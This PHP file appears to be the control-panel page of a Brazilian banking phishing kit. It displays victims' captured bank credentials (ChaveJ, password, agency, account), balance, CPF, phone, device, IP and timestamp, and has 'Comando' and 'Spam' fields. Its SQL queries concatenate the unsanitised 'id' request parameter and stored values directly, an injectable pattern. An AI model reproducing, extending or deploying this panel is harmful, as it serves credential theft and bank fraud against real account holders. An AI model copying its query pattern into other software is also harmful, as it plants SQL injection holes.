<?php
require_once('../function.php');
require_once('../conexao.php');

if (!isset($_SESSION['nome_usu_sessao'])) :
    $_SESSION['msg'] = "<div class='alert alert-danger icons-alert'>
    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
    <i class='icofont icofont-close-line-circled'></i>
    </button>
    <p><strong>Erro!</strong> Você precisa autenticar primeiro para ver esta pagina.</p>
    </div>";
    header("Location: ./login.php");
    exit();
endif;

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_Cliente = sprintf("SELECT * FROM infos WHERE id = '" . $_GET['id'] . "'");
$Cliente = mysqli_query($ConnectDB, $query_Cliente);
$row_Cliente = mysqli_fetch_assoc($Cliente);
$totalRows_Cliente = mysqli_num_rows($Cliente);

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_Cliente2 = sprintf("SELECT * FROM empresas WHERE chavej = '" . $row_Cliente['agencia'] . "'");
$Cliente2 = mysqli_query($ConnectDB, $query_Cliente2);
$row_Cliente2 = mysqli_fetch_assoc($Cliente2);
$totalRows_Cliente2 = mysqli_num_rows($Cliente2);

mysqli_select_db($ConnectDB, $database_ConnectDB);
$query_Cliente3 = sprintf("SELECT * FROM pinpag WHERE usuario = '" . $row_Cliente['agencia'] . "'");
$Cliente3 = mysqli_query($ConnectDB, $query_Cliente3);
$row_Cliente3 = mysqli_fetch_assoc($Cliente3);
$totalRows_Cliente3 = mysqli_num_rows($Cliente3);
?>
<tbody>

    <?php

    if (!empty($row_Cliente2['empresa'])) {

    ?>

        <tr>
            <td>ChaveJ:</td>
            <td><span id="usuariocopy" class="agencia"><?php print $row_Cliente['agencia']; ?></span> <button onclick="copiarUsuario(this)" type="button" class="badge badge-primary">Copiar</button></td>
        </tr>
        <tr>
            <td>Senha:</td>
            <td><span id="senhacopy" class="conta"><?php print $row_Cliente['conta']; ?></span> <button onclick="copiarSenha(this)" type="button" class="badge badge-primary">Copiar</button></td>
        </tr>

    <?php
    } else {

    ?>

        <tr>
            <td>Agencia:</td>
            <td><span id="usuariocopy" class="agencia"><?php print $row_Cliente['agencia']; ?></span> <button onclick="copiarUsuario(this)" type="button" class="badge badge-primary">Copiar</button></td>
        </tr>
        <tr>
            <td>Conta:</td>
            <td><span id="senhacopy" class="conta"><?php print $row_Cliente['conta']; ?></span> <button onclick="copiarSenha(this)" type="button" class="badge badge-primary">Copiar</button></td>
        </tr>

    <?php

    } ?>

    <tr>
        <td width="15%">Comando:</td>
        <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente['comando']; ?></span></td>
    </tr>

    <?php

    if (!empty($row_Cliente2['empresa'])) {

    ?>

        <tr>
            <td width="15%">Nome:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente2['usuario']; ?></span></td>
        </tr>

        <tr>
            <td width="15%">Empresa:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente2['empresa']; ?></span></td>
        </tr>
        <tr>
            <td width="15%">Agencia:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente2['agencia']; ?></span></td>
        </tr>
        <tr>
            <td width="15%">Conta:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente2['conta']; ?></span></td>
        </tr>
        <tr>
            <td width="15%">Navegador:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente2['browser']; ?></span></td>
        </tr>

    <?php
    }

    ?>
    <?php

    if (!empty($row_Cliente3['cpf'])) {

    ?>

        <tr>
            <td width="15%">Nome:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente3['nome']; ?></span></td>
        </tr>

        <tr>
            <td width="15%">Saldo:</td>
            <td><span class="comando" style="text-transform: uppercase;"><b>R$ <?php print $row_Cliente3['saldo']; ?></b></span></td>
        </tr>
        <tr>
            <td width="15%">CPF:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente3['cpf']; ?></span></td>
        </tr>
        <tr>
            <td width="15%">Telefone:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente3['telefone']; ?></span></td>
        </tr>
        <tr>
            <td width="15%">Agencia:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente3['agencia']; ?></span></td>
        </tr>

        <tr>
            <td width="15%">Conta:</td>
            <td><span class="comando" style="text-transform: uppercase;"><?php print $row_Cliente3['conta']; ?></span></td>
        </tr>

    <?php
    }

    ?>
    <tr>
        <td width="15%">Spam:</td>
        <td><span class="texto" style="text-transform: uppercase;"><?php print $row_Cliente['ads']; ?></span></td>
    </tr>
    <tr>
        <td>Dispositivo:</td>
        <td><span class="userAgent" style="text-transform: uppercase;"><?php print $row_Cliente['dispositivo']; ?></span></td>
    </tr>
    <tr>
        <td>IP:</td>
        <td><span class="ip"><?php print $row_Cliente['ip']; ?></span></td>
    </tr>
    <tr>
        <td>Data Hora:</td>
        <td><span class="data"><?php print $row_Cliente['datahora']; ?></span></td>
    </tr>
    <tr>
        <td>Tipo:</td>
        <td><span class="tipo" style="text-transform: uppercase;"><?php print $row_Cliente['tipo_conta']; ?></span></td>
    </tr>

</tbody>